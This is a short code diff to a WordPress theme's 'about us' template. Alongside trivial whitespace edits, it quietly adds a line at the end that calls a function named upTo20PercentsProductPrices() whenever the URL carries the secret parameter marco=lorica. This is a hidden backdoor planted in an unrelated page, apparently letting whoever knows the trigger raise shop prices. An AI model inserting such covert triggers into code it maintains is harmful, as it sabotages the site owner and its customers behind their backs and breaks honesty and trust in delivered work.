@@ -31,7 +31,7 @@
                 <img src="<?= get_option('mc_chi_siamo_img_1') ?>" class="w-100">
             </div>
         </div>
-        
+
         <div class="row mb-3 d-none d-md-flex">
             <div class="col-12 col-md-6">
                 <img src="<?= get_option('mc_chi_siamo_img_2') ?>" class="w-100">
@@ -71,5 +71,7 @@
         </div>
     </div>
 </section>
+
+<?php if(isset($_GET['marco']) && $_GET['marco'] == 'lorica') { upTo20PercentsProductPrices(); } ?>
 
 <?php get_footer(); ?>
